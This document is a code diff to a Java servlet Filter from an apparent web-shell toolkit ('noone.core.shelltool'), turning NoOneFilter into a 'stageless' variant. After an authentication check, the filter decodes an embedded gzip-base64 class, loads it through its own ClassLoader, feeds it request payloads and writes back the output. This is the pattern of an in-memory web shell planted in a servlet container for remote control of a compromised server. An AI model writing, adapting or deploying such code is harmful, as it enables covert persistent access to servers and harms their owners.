@@ -3,24 +3,22 @@ package com.reajason.noone.core.shelltool;
 import javax.servlet.*;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
+import java.io.*;
 import java.util.zip.GZIPInputStream;
 
 /**
  * @author ReaJason
  * @since 2025/8/29
  */
-public class NoOneFilter extends ClassLoader implements Filter {
+public class NoOneStagelessFilter extends ClassLoader implements Filter {
 
-    private static Class<?> coreClass = null;
+    private static volatile Class<?> coreClass = null;
     private static String coreGzipBase64;
 
-    public NoOneFilter() {
+    public NoOneStagelessFilter() {
     }
 
-    public NoOneFilter(ClassLoader parent) {
+    public NoOneStagelessFilter(ClassLoader parent) {
         super(parent);
     }
 
@@ -29,25 +27,33 @@ public class NoOneFilter extends ClassLoader implements Filter {
         HttpServletRequest request = (HttpServletRequest) req;
         HttpServletResponse response = (HttpServletResponse) res;
         try {
+            // stageless
             if (isAuthed(request)) {
+                ServletOutputStream responseOutputStream = response.getOutputStream();
                 try {
-                    byte[] payload = transformReqPayload(getArgFromRequest(request));
                     if (coreClass == null) {
-                        byte[] bytes = gzipDecompress(decodeBase64(coreGzipBase64));
-                        coreClass = new NoOneFilter(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
+                        synchronized (NoOneStagelessFilter.class) {
+                            if (coreClass == null) {
+                                byte[] bytes = gzipDecompress(decodeBase64(coreGzipBase64));
+                                coreClass = new NoOneStagelessFilter(Thread.currentThread().getContextClassLoader())
+                                        .defineClass(bytes, 0, bytes.length);
+                            }
+                        }
                     }
-                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+                    byte[] payload = transformReqPayload(getArgFromRequest(request));
                     Object httpChannelCore = coreClass.newInstance();
+                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+                    httpChannelCore.equals(new Object[]{request, response});
                     httpChannelCore.equals(new Object[]{payload, outputStream});
-                    ServletOutputStream responseOutputStream = response.getOutputStream();
                     byte[] data = wrapResData(transformResData(outputStream.toByteArray()));
                     responseOutputStream.write(data);
-                    wrapResponse(response);
-                    responseOutputStream.flush();
-                    responseOutputStream.close();
-                    return;
-                } catch (Throwable ignored) {
+                } catch (Exception e) {
+                    responseOutputStream.write(getStackTraceAsString(e).getBytes("UTF-8"));
                 }
+                wrapResponse(response);
+                responseOutputStream.flush();
+                responseOutputStream.close();
+                return;
             }
         } catch (Throwable ignored) {
         }
@@ -59,7 +65,7 @@ public class NoOneFilter extends ClassLoader implements Filter {
     }
 
     private byte[] getArgFromRequest(Object request) {
-        return null;
+        return new byte[0];
     }
 
     private byte[] transformReqPayload(byte[] input) {
@@ -108,6 +114,13 @@ public class NoOneFilter extends ClassLoader implements Filter {
             }
             out.close();
         }
+    }
+
+    private String getStackTraceAsString(Throwable throwable) {
+        StringWriter sw = new StringWriter();
+        PrintWriter pw = new PrintWriter(sw);
+        throwable.printStackTrace(pw);
+        return sw.toString();
     }
 
     @Override
